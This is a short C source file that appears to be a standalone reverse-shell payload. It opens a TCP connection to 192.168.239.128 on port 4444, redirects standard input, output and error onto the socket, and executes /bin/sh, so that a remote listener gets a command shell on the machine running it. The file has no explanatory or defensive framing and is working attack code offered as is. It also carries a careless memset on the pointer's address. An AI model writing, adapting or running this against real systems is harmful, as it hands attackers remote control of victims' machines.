#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SOCKET_CREATE_ERROR 0x1
#define SOCKET_CONNECT_ERROR 0x2
#define PORT 4444
#define IP "192.168.239.128"


int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in *serv_addr;

    memset(&serv_addr, 0, sizeof(struct sockaddr_in));
    serv_addr = (struct sockaddr_in *) malloc(sizeof(struct sockaddr_in));
    serv_addr->sin_family = AF_INET;
    serv_addr->sin_port = htons(PORT);
    serv_addr->sin_addr.s_addr = inet_addr(IP);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
	printf("[!] Error creating socket\n");
	exit(SOCKET_CREATE_ERROR);
    }

    if (connect(sockfd, (struct sockaddr *)serv_addr, sizeof(struct sockaddr_in)) < 0) {
	printf("[!] Error with socket connect\n");
	exit(SOCKET_CONNECT_ERROR);
    }

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
